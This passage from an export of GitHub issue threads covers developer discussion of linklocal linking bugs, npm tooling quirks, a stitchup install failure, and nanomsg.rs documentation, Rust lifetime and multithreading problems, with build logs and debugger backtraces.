    <Title>Inconsistency in left/right keydowns</Title>
    <Owner>timoxley</Owner>
    <Body>Just wondering, why is it that ctrl/shift/alt don't distinguish between left/right, but the Mac command key does?
</Body>
    <State>open</State>
    <Comment>
      <Owner>heymath</Owner>
      <Body>I guess because keycode uses `event.keyCode` to determine key names, and it seems that `cmd left` and `cmd right` have different `keyCode`, but `ctrl left` and `ctrl right` share the same `keyCode` with an `event.location` set to 1 or 2 to make the difference :/
</Body>
    </Comment>
    <Comment>
      <Owner>ctf0</Owner>
      <Body>also **keydown** could give different keycode from **keypress**</Body>
    </Comment>
  </Issue_376>
  <Issue_377>
    <Repository>linklocal</Repository>
    <Title>Fix recursive linking #37</Title>
    <Owner>timoxley</Owner>
    <Body>I went ahead to try to fix the issue I had when packages were not correctly linked in the root folder when doing recursive linking. &#13;
&#13;
I was not able to run the test on my machine so I did not create a test for this feature. </Body>
    <State>open</State>
    <Comment>
      <Owner>spoldman</Owner>
      <Body>@timoxley Just wanted to check if you have taken a look at this PR. </Body>
    </Comment>
  </Issue_377>
  <Issue_378>
    <Repository>linklocal</Repository>
    <Title>Does not link nested dependencies when they are inside the root node_modules folder</Title>
    <Owner>timoxley</Owner>
    <Body>I have a repository that is getting packages from a monorepo and those packages depend on each other. But no matter what I do I'm not able to use linklocal to link those subpackages of the package that I'm importing.&#13;
&#13;
**Here is an example:**&#13;
&#13;
MainApp dependencies &#13;
 -&gt; packageA&#13;
&#13;
packageA dependencies :&#13;
-&gt; packageB&#13;
&#13;
if I run the following inside the MainApp only node_modules/packageA gets linked not node_modules/packageB&#13;
`linklocal --named packageA packageB`&#13;
&#13;
If I run it with the recursive flag it only links the node_modules/packageA/node_modules/packageB not node_modules/packageB&#13;
&#13;
Should it not also link packageB when the recursive flag is set?</Body>
    <State>open</State>
    <Comment>
      <Owner>spoldman</Owner>
      <Body>This might have something to do with how yarn does workspaces. That the shared dependency is placed in the root folder instead of having them in the linked package. Just a wild guess.</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@spoldman can you set a test repo or give some step-by-step instructions so I can reproduce this?</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@spoldman I re-read your question and I believe this is actually expected/correct behaviour. `linklocal` will only link the dependencies specified in `package.json`, it doesn't do any form of hoisting, and shouldn't need to if your dependencies are all explicitly specified. &#13;
&#13;
If I understand correctly, you must be trying to `require('packageB')` from the top level, or from some other package that doesn't have `packageB` listed as a `package.json` dependency?  &#13;
&#13;
You probably shouldn't expect to be able to `require` anything that isn't explicitly defined in the current `package.json`. That you can `require` sub-dependencies after a regular `npm install` is an artifact of npm's hoisting algorithm, which is more of an optimisation/implementation detail rather than a feature that should be exploited by user code.&#13;
&#13;
It's entirely possible that in the future the hoisting algorithm will determine that a sub-dependency can no longer be hoisted, or perhaps an update to the package(s) that dependency is hoisted out of no longer depend on it, and mysteriously your app will no longer be able to require that particular dependency.&#13;
&#13;
In other words, **anything that requires on `packageB` should explicitly define `packageB` as a dependency in its closest `package.json`** &#8211; the same goes for everything you're requiring.&#13;
&#13;
If you add `packageB` to your top level `package.json`, and/or to whichever packages depend on `packageB`, I believe that will have the effect you're after, without needing to add any special-case behaviour to `linklocal`. Please try this and let me know if this solves your issue, I may have misunderstood.</Body>
    </Comment>
    <Comment>
      <Owner>spoldman</Owner>
      <Body>I created a test repo: https://github.com/spoldman/linklocal-test and I think this is a Yarn only issue. Because everything works fine with NPM. Looks like Yarn puts package-b inside the MainApp/node_modules folder but npm does not. I tested both using workspaces and not and both cases resulted in yarn putting package-b inside MainApp/node_modules folder. &#13;
&#13;
MainApp/node_modules&#13;
![image](https://user-images.githubusercontent.com/10643226/45418196-62ce9480-b673-11e8-9af1-6c6598f34f30.png)&#13;
&#13;
Steps to reproduce&#13;
&#13;
./packages run: yarn install&#13;
./MainApp run: yarn install&#13;
./MainApp run: linklocal -r --named package-a package-b ../packages/libs&#13;
&#13;
Notice that only package-a get liked inside MainApp/node_modules&#13;
&#13;
&#13;
I'm using Yarn 1.9.4</Body>
    </Comment>
    <Comment>
      <Owner>spoldman</Owner>
      <Body>@timoxley have you had time to look at the test repo I sent?</Body>
    </Comment>
  </Issue_378>
  <Issue_379>
    <Repository>linklocal</Repository>
    <Title>Create symlinks instead of junctions on Windows?</Title>
    <Owner>timoxley</Owner>
    <Body>On windows, the junctions created by linklocal means that git clean does not only delete the symlinks (junctions) but also the files in the linked folders, which then prevens the use of git clean with linklocal / yarn. This is apparently not the case on UNIX.&#13;
&#13;
Would it be possible to change linklocal to create symlinks on Windows instead (which does exist in the NTFS filesystem now) (see mklink documentation)?&#13;
&#13;
As documented here [https://www.bountysource.com/issues/990899-git-clean-d-deletes-files-in-junctioned-directories-on-windows](url) `git clean -df` will delete files in folders linked by junctions. I have tried the same thing using `mlink /D link target` instead, and then files in the linked folder is not deleted.&#13;
&#13;
Thanks&#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>I have never used node on windows, if you can submit a pull request that adds a flag for toggling symlinks/junctions i would accept that</Body>
    </Comment>
    <Comment>
      <Owner>hoegge</Owner>
      <Body>Ok. Requires Node 8.10.0 or higher to work (libuv 1.19.1 needed for symlinks to work on Windows). Will come back with pull request&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@hoegge is this still an issue?</Body>
    </Comment>
    <Comment>
      <Owner>hoegge</Owner>
      <Body>Yes - I believe so. I considered looking into changing it myself, but didn&#8217;t have the time. So unless someone else have fixed it I think it would be - can test at some point.</Body>
    </Comment>
  </Issue_379>
  <Issue_380>
    <Repository>npm-fresh</Repository>
    <Title>more robust resetting of npm cache-min setting</Title>
    <Owner>timoxley</Owner>
    <Body>sometimes it will leave the cache-min setting at Infinity.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Suspect this happens due to crashes, maybe only a problem while developing npm-fresh.
</Body>
    </Comment>
  </Issue_380>
  <Issue_381>
    <Repository>npm-run</Repository>
    <Title>Why is this so much simpler than npm/npm#4058?</Title>
    <Owner>timoxley</Owner>
    <Body>The code in https://github.com/npm/npm/pull/4058, of which I believe most of is extracted from npm as it exists today, seems a lot larger. Is this module just as capable? If so, can we use it in npm itself? :)
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>&gt; Is this module just as capable?

This module is really just:
1. set me up the correct npm $PATH
2. exec shell command with $PATH set in the env

The 'heavy lifting' is done by https://github.com/timoxley/npm-path.

`npm-run` currently doesn't handle [whatever nasty business is going on in there](https://github.com/npm/npm/pull/4058/files#diff-a9128ad46b3dd8b36ea6a0804215c0dfR119) with the npm config environment, nor does it execute package.json scripts. Might be 1 or 2 additional modules to be made breaking that out. A big plus breaking these up finely is the functionality becomes a lot easier to wrangle into a test.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>I'd really like to see every npm command be a self-contained module. npm becomes just a container for integration.
</Body>
    </Comment>
  </Issue_381>
  <Issue_382>
    <Repository>npm-tutor</Repository>
    <Title>--save-prefix is undocumented and allows "@"</Title>
    <Owner>timoxley</Owner>
    <Body>I can't find it mentioned by `npm help install`, oversight?

Also, `npm install --save --save-prefix "@" once` "works"... but isn't valid, what's with that?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sam-github</Owner>
      <Body>And once the `@` is in the packages.json, you can't call npm install anymore to save with a new prefix:

```
npm-workshop ~/w/nc/npm-tutor&gt; npm install --save --save-prefix '&gt;=' once
npm WARN package.json npm-tutor@0.0.0 No description
npm WARN package.json npm-tutor@0.0.0 No repository field.
npm WARN package.json npm-tutor@0.0.0 No README data
npm ERR! notarget No compatible version found: once@'@1.3.0'
npm ERR! notarget Valid install targets:
npm ERR! notarget ["1.1.1","1.2.0","1.3.0"]
npm ERR! notarget 
npm ERR! notarget This is most likely not a problem with npm itself.
npm ERR! notarget In most cases you or one of your dependencies are requesting
npm ERR! notarget a package version that doesn't exist.

npm ERR! System Linux 3.11.0-24-generic
npm ERR! command "/usr/local/bin/node" "/usr/local/bin/npm" "install" "--save" "--save-prefix" "&gt;=" "once"
npm ERR! cwd /home/sam/w/nc/npm-tutor
npm ERR! node -v v0.10.29
npm ERR! npm -v 1.4.14
npm ERR! code ETARGET
npm ERR! 
npm ERR! Additional logging details can be found in:
npm ERR!     /home/sam/w/nc/npm-tutor/npm-debug.log
npm ERR! not ok code 0
npm-workshop ~/w/nc/npm-tutor&gt; grep once package.json 
    "once": "@1.3.0",
```
</Body>
    </Comment>
  </Issue_382>
  <Issue_383>
    <Repository>pkgcount</Repository>
    <Title>add ability to count / categorize lifecycle scripts</Title>
    <Owner>timoxley</Owner>
    <Body>I know this isn't simple, because this isn't something that `npmd-tree` supports, but for some of the more brutal npm bugs I've been working my way through recently (like npm/npm#5920, which has managed to stymie both @isaacs and me so far), it would be extremely useful to know how many lifecycle scripts there are, what lifecycle events they're listening to, and what they're running.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Doable, might be another tool though. Can you give an example of the output you're looking for? Is it summarized or just lists them all?
</Body>
    </Comment>
    <Comment>
      <Owner>othiym23</Owner>
      <Body>Either a summary or an enumeration, hidden behind an option flag, would be fine with me. This isn't something I need all the time. You're right that it may be a new tool.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@othiym23 this is the place to implement such a feature: https://github.com/timoxley/installed
</Body>
    </Comment>
  </Issue_383>
  <Issue_384>
    <Repository>pkgfiles</Repository>
    <Title>Allow specifying multiple directories in the CLI.</Title>
    <Owner>timoxley</Owner>
    <Body>When multiple directories are specified, an aggregate total is
calculated and displayed. In JSON mode, an array is returned.

---

Should mapLimit be Infinity or 1? Should all of the results only be dipslayed at the end of the map, or (as it is currently), as soon as results are available?
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Can you please update the readme?
</Body>
    </Comment>
    <Comment>
      <Owner>forivall</Owner>
      <Body>@timoxley Updated. I also updated the usage
</Body>
    </Comment>
  </Issue_384>
  <Issue_385>
    <Repository>stitchup</Repository>
    <Title>Problem installing async</Title>
    <Owner>timoxley</Owner>
    <Body>I get:

``` sh
&gt; async@0.1.17 preinstall /usr/local/lib/node_modules/stitchup/node_modules/stitch/node_modules/async
&gt; make clean

rm -rf dist

&gt; async@0.1.17 install /usr/local/lib/node_modules/stitchup/node_modules/stitch/node_modules/async
&gt; make build

mkdir -p dist
/usr/local/lib/node_modules/stitchup/node_modules/stitch/node_modules/async/node_modules/uglify-js/bin/uglifyjs lib/async.js &gt; dist/async.min.js
/bin/sh: /usr/local/lib/node_modules/stitchup/node_modules/stitch/node_modules/async/node_modules/uglify-js/bin/uglifyjs: No such file or directory
make: *** [build] Error 127
npm ERR! error installing async@0.1.17
npm ERR! error installing stitch@0.3.3
npm ERR! error installing stitchup@0.1.8

npm ERR! async@0.1.17 install: `make build`
npm ERR! `sh "-c" "make build"` failed with 2
npm ERR! 
npm ERR! Failed at the async@0.1.17 install script.
npm ERR! This is most likely a problem with the async package,
npm ERR! not with npm itself.
npm ERR! Tell the author that this fails on your system:
npm ERR!     make build
npm ERR! You can get their info via:
npm ERR!     npm owner ls async
npm ERR! There is likely additional logging output above.
npm ERR! 
npm ERR! System Darwin 12.0.0
npm ERR! command "node" "/usr/local/bin/npm" "install"
npm ERR! cwd /usr/src/extras/stitchup
npm ERR! node -v v0.6.11
npm ERR! npm -v 1.1.2
npm ERR! code ELIFECYCLE
npm ERR! message async@0.1.17 install: `make build`
npm ERR! message `sh "-c" "make build"` failed with 2
npm ERR! errno {}
npm ERR! 
npm ERR! Additional logging details can be found in:
npm ERR!     
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Interesting. Async is actually a dependency of stitch itself, and it also seems that there was recently an issue with async building https://github.com/isaacs/npm/issues/2195 

try removing your node_modules folder 

`rm -Rf ./node_modules`

and reinstalling all of your dependencies:

`npm install`
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>I take that back, there was in-fact a misconfigured path in the stitchup package. This may have been the issue, or perhaps this was combined with the above async build issue. Anyway, I've successfully been able to installed the latest stitchup (0.1.8). 

Let me know if you have any problems.
</Body>
    </Comment>
  </Issue_385>
  <Issue_386>
    <Repository>moon</Repository>
    <Title>JIT Compiler</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>It'd be nice to integrate LLVM's JIT compiler.
</Body>
    <State>open</State>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>I'll be using: https://github.com/TomBebbington/jit.rs &amp;mdash; A wrapper around LibJit
</Body>
    </Comment>
  </Issue_386>
  <Issue_387>
    <Repository>nanomsg.rs</Repository>
    <Title>Examples from the doc not working.</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>rustc 1.11.0 (9b21dcd6a 2016-08-15)

```
src/main.rs:4:5: 4:26 error: unresolved import `std::io::timer::sleep`. Could not find `timer` in `std::io` [E0432]
src/main.rs:4 use std::io::timer::sleep;
                  ^~~~~~~~~~~~~~~~~~~~~
src/main.rs:4:5: 4:26 help: run `rustc --explain E0432` to see a detailed explanation
src/main.rs:3:5: 3:34 error: module `duration` is private
src/main.rs:3 use std::time::duration::Duration;
                  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
src/main.rs:12:28: 12:34 error: mismatched types [E0308]
src/main.rs:12     let mut buffer = [0u8, ..1024];
                                          ^~~~~~
src/main.rs:12:28: 12:34 help: run `rustc --explain E0308` to see a detailed explanation
src/main.rs:12:28: 12:34 note: expected type `u8`
src/main.rs:12:28: 12:34 note:    found type `std::ops::RangeTo&lt;_&gt;`
src/main.rs:14:11: 14:33 error: no associated item named `milliseconds` found for type `std::time::Duration` in the current scope
src/main.rs:14     sleep(Duration::milliseconds(50));
                         ^~~~~~~~~~~~~~~~~~~~~~
src/main.rs:16:23: 16:28 error: no method named `write` found for type `nanomsg::Socket` in the current scope
src/main.rs:16     match push_socket.write(b"foobar") {
                                     ^~~~~
src/main.rs:16:23: 16:28 help: items from traits can only be used if the trait is in scope; the following trait is implemented but not in scope, perhaps add a `use` for it:
src/main.rs:16:23: 16:28 help: candidate #1: `use std::io::Write`
src/main.rs:21:23: 21:27 error: no method named `read` found for type `nanomsg::Socket` in the current scope
src/main.rs:21     match pull_socket.read(&amp;mut buffer) {
                                     ^~~~
src/main.rs:21:23: 21:27 help: items from traits can only be used if the trait is in scope; the following trait is implemented but not in scope, perhaps add a `use` for it:
src/main.rs:21:23: 21:27 help: candidate #1: `use std::io::Read`
error: aborting due to 4 previous errors
error: Could not compile `nanomsgtest`.
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Hi,

The stored documentation is sadly out-dated,  you'll find up-to-date examples in both the doc comments and the examples folder. The problem is already mentioned in issue #147, I think I'll give this a try in the coming weeks.
</Body>
    </Comment>
  </Issue_387>
  <Issue_388>
    <Repository>nanomsg.rs</Repository>
    <Title>Compiled documentation is out of date.</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>The linked documentation at http://thehydroimpulse.github.io/nanomsg.rs/nanomsg/struct.Socket.html does not match the actual code in the repository (the type signature of `read_to_end` is what tripped me up).
</Body>
    <State>open</State>
    <Comment>
      <Owner>vks</Owner>
      <Body>Also `NanoError` and `NanoResult` don't exist anymore.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@Parakleta Totally didn't see this until now. I'll look into this.
</Body>
    </Comment>
    <Comment>
      <Owner>lunemec</Owner>
      <Body>You can have Travis auto-build the documentation from current git repository. There are several examples, and I'm using it on my own rust projects: https://github.com/lunemec/rust-num-digitize

The travis pushes the doc into separate git branch in this repository after each commit on master, then it is served by github pages.
</Body>
    </Comment>
    <Comment>
      <Owner>lunemec</Owner>
      <Body>Oh, you already have gh-pages branch, which means the autobuild should work :) sorry, didn't notice..
</Body>
    </Comment>
    <Comment>
      <Owner>vks</Owner>
      <Body>@lunemec Now it seems like https://docs.rs/nanomsg is the best option.
</Body>
    </Comment>
    <Comment>
      <Owner>vks</Owner>
      <Body>I opened #157 which should fix this issue. Independently the current documentation seems to be up to date, so I think this issue can be closed.
</Body>
    </Comment>
  </Issue_388>
  <Issue_389>
    <Repository>nanomsg.rs</Repository>
    <Title>cant build from osx 10.11</Title>
    <Owner>thehydroimpulse</Owner>
    <Body> Downloading nanomsg v0.4.2
thread '&lt;unnamed&gt;' panicked at 'called `Result::unwrap()` on an `Err` value: A requested feature, protocol or option was not found built-in in this libcurl due to a build-time decision.', ../src/libcore/result.rs:732
thread '&lt;main&gt;' panicked at 'called `Result::unwrap()` on an `Err` value: Any', ../src/libcore/result.rs:732
</Body>
    <State>open</State>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Hi,

I tried to use nanomsg v0.4.2 from a linux machine, with a rust nightly build, and it went fine.
Do you have any problems using another crate ?
Also, what version of rust are you using ?

For information, here is the version of rust I'm using:

```
$ rustc --version
rustc 1.7.0-nightly (110df043b 2015-12-13)
$ cargo --version
cargo 0.8.0-nightly (dd32072 2015-12-12)
```

I also strongly suggest you to have a look at this [Cargo issue and comment](https://github.com/rust-lang/cargo/issues/1937#issuecomment-141190925). 

Regards,
Beno&#238;t
</Body>
    </Comment>
  </Issue_389>
  <Issue_390>
    <Repository>nanomsg.rs</Repository>
    <Title>Master tracking 1.0 or nightly ?</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>@thehydroimpulse I noticed the appveyor script is using the nightly build of rust while the travis one is using version 1.0.0. How do we go on with this now ?

@GGist This means that as long as the travis build is ok, the appveyor should be ok too, but the opposite maybe true only as  long as no new feature of rust are used.
</Body>
    <State>open</State>
    <Comment>
      <Owner>GGist</Owner>
      <Body>Ah yes, that's a good point. It can definitely be changed to use 1.0.0 instead.

I also noticed that recently the install page on the [rust site](http://www.rust-lang.org/install.html) does not have the .exe file posted, although the download link it still working. I can test to see if Appveyor will work using the .msi that is on that page in case the .exe method of installation has been deprecated.
</Body>
    </Comment>
  </Issue_390>
  <Issue_391>
    <Repository>nanomsg.rs</Repository>
    <Title>Problem with Endpoint lifetime</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>The rust nightly build cc19e3380 2014-12-20 introduced the warning reproduced below.
This drew my attention to the fact this conflicting lifetime name wasn't even used in the function !
So after resolving the name conflict, I changed the signature parameter to actually use that named lifetime but this had the effect of **breaking almost all unit tests** !!! :boom: 

With this modification, it becomes impossible to retrieve the endpoint and then to send or receive a message. For example you can use `test_bind` alone, but not `test_bind` and then `test_write`.
Calling directly `bind` without storing the result in variable and then `write` works fine.
Storing the NanoResult or the Endpoint will cause a compilation error. 

&gt; cannot borrow `push_socket` as mutable more than once at a time.

It looks like constraining the lifetime of the Endpoint to the one of the Socket makes the Endpoint a 'borrower' of the Socket.

I will post something on reddit and add the link here when done.
##### Signature before and after the change:

``` rust
fn bind&lt;'b, 'a: 'b&gt;(&amp;mut self, addr: &amp;str) -&gt; NanoResult&lt;Endpoint&lt;'b&gt;&gt;
fn bind&lt;'b, 'x: 'b&gt;(&amp;'x mut self, addr: &amp;str) -&gt; NanoResult&lt;Endpoint&lt;'b&gt;&gt;
```
##### Warning:

```
   Compiling nanomsg v0.3.0 (file:///home/travis/build/thehydroimpulse/nanomsg.rs)
/home/travis/build/thehydroimpulse/nanomsg.rs/src/lib.rs:203:21: 203:23 warning: lifetime name `'a` shadows another lifetime name that is already in scope
/home/travis/build/thehydroimpulse/nanomsg.rs/src/lib.rs:203     pub fn bind&lt;'b, 'a: 'b&gt;(&amp;mut self, addr: &amp;str) -&gt; NanoResult&lt;Endpoint&lt;'b&gt;&gt; {
                                                                                 ^~
/home/travis/build/thehydroimpulse/nanomsg.rs/src/lib.rs:123:6: 123:8 help: shadowed lifetime `'a` declared here
/home/travis/build/thehydroimpulse/nanomsg.rs/src/lib.rs:123 impl&lt;'a&gt; Socket&lt;'a&gt; {
                                                                  ^~
/home/travis/build/thehydroimpulse/nanomsg.rs/src/lib.rs:203:21: 203:23 help: shadowed lifetimes are deprecated and will become a hard error before 1.0
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Yeah, I recently hit this issue myself. There's a bug in the rustc compiler that prevents using lifetime constraints and using the same lifetime against `&amp;self`. https://github.com/rust-lang/rust/issues/18232

It appears like the issue has been fixed already so we can start using it.

Edit: ahh, it seems like you've already tried it.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Your example of

``` rust
fn bind&lt;'b, 'x: 'b&gt;(&amp;'x mut self, addr: &amp;str) -&gt; NanoResult&lt;Endpoint&lt;'b&gt;&gt;
```

Is what I imagined to work, but that doesn't seem to be the case.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>It works when it comes to prevent someone from using an endpoint outside the scope of a socket.
The following scenario is correctly reported as an error by the compiler.

``` rust
let mut e;
{
    let mut socket = ...
    e = socket.bind(...).unwrap();
}
e.shutdown();
```

But we have now a problem because it seems that the socket mutability has been transfered to the endpoint.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>The suggestions I got on irc are
- Clone and Copy : we don't want this.
- Move the read and write functions to the endpoint : big change, not sure if feasible
- Have the bind/connect functions return a socket and an endpoint : feel strange but could work.

But we could also completely remove the lifetime constraint until we find the solution.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Yeah, I think option 1 and 2 are a no go. Option 3 seems a bit contrary to the goal of having M endpoints to N sockets.

I think the best option would be to remove the constraints until we find another solution like you suggested.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Another option would be to make the self parameter of `bind` and `connect` const instead of mut.
But that does feel like lying.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@blabaere I'd actually be ok with that because it would be considered interior mutability. As long as we can prove it to be safe given the extra freedom you have with `&amp;self` versus `&amp;mut self`, it would be ok.

Trying to think of what problems could occur if we were to do that, but none are coming up atm.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>I spoke too fast, that works only when not keeping the endpoint ...
</Body>
    </Comment>
  </Issue_391>
  <Issue_392>
    <Repository>nanomsg.rs</Repository>
    <Title>Document each public function</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>We now have [generated documentation](http://thehydroimpulse.github.io/nanomsg.rs/nanomsg) setup using Travis and Github pages but we now need to write some content to fill the gaps.
</Body>
    <State>open</State>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>That's really great !
</Body>
    </Comment>
  </Issue_392>
  <Issue_393>
    <Repository>nanomsg.rs</Repository>
    <Title>Multi-threading</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>I haven't been able to dig down into it but I want to figure out a way we can get this library to be multi-threaded. As far as I can tell, we aren't using threads/tasks at all in the tests anymore. Nanomsg in theory should be thread-safe (and that was one of the original goals versus something like ZeroMQ where it was strictly thread-unsafe.
</Body>
    <State>open</State>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>I created a multithreaded test and put the test runner inside a script loop. 
See libnanomsg https://github.com/blabaere/nanomsg.rs/tree/multithreadtest
I found the following problems : 
- Sometime, the test runner would just refuse to die, gdb reports: No threads. Linux Process Explorer does not show any thread and displays the process as stuck in 'futex_wait_queue_me'.
- Sometime, an assertion fails inside nanomsg :Bad file descriptor [9](src/aio/poller_epoll.inc:107)
- Sometime, this one : Resource temporarily unavailable [11](src/utils/efd_eventfd.inc:75)
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Thanks @blabaere for digging into this. Yeah, it seems really odd. I only started hitting these issues when I had gotten far enough in implementing this library and now it seems it's never not hitting those issues. I know nanomsg said they _tried_ to be thread-safe but there may be a few areas which are not.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Finally got one example where it would hang forever but let me debug it:
#0  0x00007f51cf52c9b3 in epoll_wait () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007f51d0049932 in nn_poller_wait (self=0x7f51d026c644, timeout=100) at src/aio/poller_epoll.inc:186
#2  0x00007f51d004c35e in nn_worker_routine (arg=0x7f51d026c600) at src/aio/worker_posix.inc:176
#3  0x00007f51d004e67d in nn_thread_main_routine (arg=&lt;optimized out&gt;) at src/utils/thread_posix.inc:35
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>My bad, it looks like I should add some more sync between the tasks.
To sum up, I feel like to make this work, one must make sure bind is effective before calling connect, and make sure receive is effective before calling send. And none of them is effective right away when called (this is the reason the sleep calls in the original tests)

Here, the sender task is waiting for the end of the test, and the receiver task is waiting for the message.

Receiver:

```
#0  0x00007ff33a09b963 in poll () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007ff33abc83f8 in nn_efd_wait (self=&lt;optimized out&gt;, timeout=-1) at src/utils/efd.c:48
#2  0x00007ff33abc36c9 in nn_sock_recv (self=0x7ff320000930, msg=0x7ff333ffe7d0, flags=&lt;optimized out&gt;) at src/core/sock.c:671
#3  0x00007ff33abc0e07 in nn_recvmsg (s=&lt;optimized out&gt;, msghdr=0x7ff333ffe880, flags=&lt;optimized out&gt;) at src/core/global.c:872
#4  0x00007ff33abc110e in nn_recv (s=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;, flags=&lt;optimized out&gt;) at src/core/global.c:707
#5  0x00007ff33b02fd6e in tests::test_receive::h0ec28f9462429bc7fqa () at src/lib.rs:335
#6  0x00007ff33b032c5d in tests::should_create_a_pipeline_mt::closure.3416 () at src/lib.rs:390
```

Sender:

```
#0  0x00007ff33a593d84 in pthread_cond_wait@@GLIBC_2.3.2 () from /lib/x86_64-linux-gnu/libpthread.so.0
#1  0x00007ff33b0d8eef in sync::barrier::Barrier::wait::h8f2657fc8601dd6brVp ()
#2  0x00007ff33b032311 in tests::should_create_a_pipeline_mt::closure.3377 () at src/lib.rs:378
```
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>That blog also uses sleep between bind and connect, in seconds:
http://tim.dysinger.net/posts/2013-09-16-getting-started-with-nanomsg.html
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Interesting. I'm wondering if that's the expected procedure for nanomsg, to wait an arbitrary length of time.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>It seems that thread-safety is bought with asynchronous behavior in some
places. I will digg a little bit more.

Le mar. 9 d&#233;c. 2014 22:37, Daniel Fagnan notifications@github.com a
&#233;crit :

&gt; Interesting. I'm wondering if that's the expected procedure for nanomsg,
&gt; to wait an arbitrary length of time.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/thehydroimpulse/nanomsg.rs/issues/70#issuecomment-66362504
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Indeed, using barrier and sleep all over the place to ensure that bind/connect and send/receive correct timings fixes the problem where the test runner would hang forever.

A call to nn_term and one more sleep fixes the nanomsg assertion failures.

The ugliness can be witnessed here: https://github.com/blabaere/nanomsg.rs/blob/multithreadtest/libnanomsg/src/lib.rs

@thehydroimpulse, are we sure we want to show this kind of stuff ?
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@blabaere mmmm, that's a bit unfortunate. 
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Got it right this time ! 

The send/receive order issue I ~~saw~~ imagined was only the requirement to **not close the sender too early**, that is before the receiver ever gets a chance to see the message. And now it works without any sleep calls, even with several parallel tests.

And the bind/connect order requirements can also be dropped. But if you implement that ordering "manually" with barriers the test runs way faster than if you let nanomsg handle the "retry" (wild guess).

And guess who looks all nice and tidy now ?https://github.com/blabaere/nanomsg.rs/blob/multithreadtest/libnanomsg/src/lib.rs
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@blabaere Wow, that's awesome! That looks sooo much cleaner.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>To check the thread-safety of individual sockets, one should be shared between several tasks. But of course, Rust will not let you do that since all the read/write operations require a mutable socket.
The mutability being specified in the traits, the only way I see to make this possible is to allow the cloning off the sockets.

@thehydroimpulse, do you see any problem with `Socket` having the `Clone` trait, or do you think there is another way to enable socket sharing between tasks ?
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@blabaere I don't see a huge problem with having `Clone` implemented for the socket. This is how the Tcp sockets in Rust work so that you can have a thread dedicated to blocking on receiving new connections and another thread can close the socket over the boundary. Otherwise there's no way to shutdown that thread.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>There's an implied ownership over sockets, however. Less so with nanomsg because they're not as generic as raw tcp. For example, if two threads can read and write on the same socket, you have to have some sort of implied ownership on what operations should be allowed on either thread (otherwise both threads can be reading and they both won't get the full message, it'll be split between the two)
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>I didn't think of that message split problem, but it must be fun to debug too.

Another potential problem I see now is that nanomsg recycles the int values returned by `nn_socket`.
If a user clones a Rust socket, drops one of the clones and then recreates another socket, there is a good chance he will end up with two different Rust sockets using the same C socket, with funny effects. This would probably be quite difficult to diagnose.

The choice we have is between :
- a safe one (no change), with the downside of not allowing any sharing of sockets between tasks.
- a powerful but risky one (clone), with the downside of letting a user shoot himself in the foot.
